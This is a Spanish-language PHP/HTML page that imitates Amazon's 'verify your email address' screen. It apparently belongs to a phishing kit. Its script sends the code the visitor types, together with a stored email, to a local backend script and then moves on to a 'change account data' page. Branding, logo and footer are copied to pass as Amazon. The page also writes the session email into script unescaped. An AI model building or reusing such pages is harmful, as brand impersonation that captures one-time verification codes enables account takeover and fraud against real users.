<?php
session_start();
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verificar dirección de correo electrónico - Amazon</title>
    <link rel="stylesheet" href="css/verificar.css">
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var storedEmail = "<?php echo isset($_SESSION['email']) ? $_SESSION['email'] : 'correo@example.com'; ?>";
            var emailElement = document.querySelector(".email");
            emailElement.textContent = storedEmail;
            localStorage.setItem("email", storedEmail); // Guardar email en localStorage
            document.getElementById("hidden-email").value = storedEmail;
        });

        function handleVerification() {
            var code = document.querySelector(".code-input").value;
            var email = localStorage.getItem("email");

            console.log("Sending verification request:", { email: email, code: code });

            fetch('BACK/actualizar_email1.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email: email, code: code })
            })
            .then(response => response.json())
            .then(data => {
                console.log("Received response:", data);
                if (data.success) {
                    alert("Código verificado correctamente.");
                    window.location.href = "cambiar_datos_email2.php";
                } else {
                    alert("Código incorrecto. Por favor, intenta de nuevo.");
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</head>
<body>
    <section class="flex1">
        <div class="logo">
            <img src="imagenes/logo2.png" alt="Amazon Logo"/>
        </div>
    </section>
    <div class="container">
        <h2 class="title">Verificar dirección de correo electrónico</h2>
        <p>Para verificar tu correo electrónico, hemos enviado un código a <span class="email">correo@example.com</span> (<a href="#" class="change-email">Cambiar</a>)</p>
        <b><p>Introducir código</p></b>
        <input type="text" class="code-input">
        <div class="button-container">
            <button class="button" onclick="handleVerification()">Continuar</button>
        </div>
        <div class="code1">
            <p>Al crear una cuenta, aceptas las <a href="#" class="terms">Condiciones de Uso</a> y el <a href="#" class="privacy">Aviso de Privacidad</a> de amazon.com.</p>
        </div>
        <div class="code2">
            <a href="#" class="volver">Volver a enviar código</a>
        </div>
    </div>
    <section class="flex2">
        <div class="links">
            <a href="#" class="help">Ayuda</a> | <a href="#" class="terms">Condiciones de Uso</a> | <a href="#" class="privacy">Aviso de Privacidad</a>
            <p>&copy; 1996-2024 Amazon.com, Inc. o sus afiliados</p>
        </div>
    </section>
</body>
</html>
